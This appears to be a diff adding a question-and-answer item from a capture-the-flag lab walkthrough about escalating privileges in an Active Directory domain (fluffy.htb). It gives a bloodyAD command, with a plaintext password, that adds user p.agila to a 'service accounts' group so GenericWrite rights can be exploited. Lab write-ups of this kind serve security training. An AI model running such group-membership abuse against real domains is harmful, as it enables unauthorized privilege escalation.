@@ -1,0 +1,9 @@
+TECHNIQUE / QUESTION:
+How can you further exploit the privileges of the p.agila user?
+
+CONTEXT:
+You have authenticated successfully as p.agila.
+
+METHOD / ANSWER:
+Command: `bloodyAD -d fluffy.htb -u p.agila -p 'prometheusx-303' --host dc01.fluffy.htb add groupMember 'service accounts' p.agila`
+Explanation: Add the p.agila user to the Service Accounts group, allowing exploitation of GenericWrite attributes.
